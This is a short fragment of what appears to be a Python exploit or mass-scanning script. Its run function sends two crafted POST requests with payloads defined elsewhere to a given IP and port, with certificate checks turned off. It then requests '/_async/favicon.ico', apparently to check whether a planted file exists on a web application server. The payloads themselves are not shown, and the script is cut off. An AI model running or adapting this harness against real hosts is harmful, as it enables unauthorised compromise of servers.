...
def run(ip,port,index,h):
    r1 = requests.post(h + str(ip) + ':' + str(port) + path1, headers=headers, data=payload1, timeout=3,verify=False)
    time.sleep(1)
    r2 = requests.post(h + str(ip) + ':' + str(port) + path2, headers=headers, data=payload2, timeout=3,verify=False)
    time.sleep(1)
    r3 = requests.get(h + str(ip) + ':' + str(port) + '/_async/favicon.ico',verify=False)
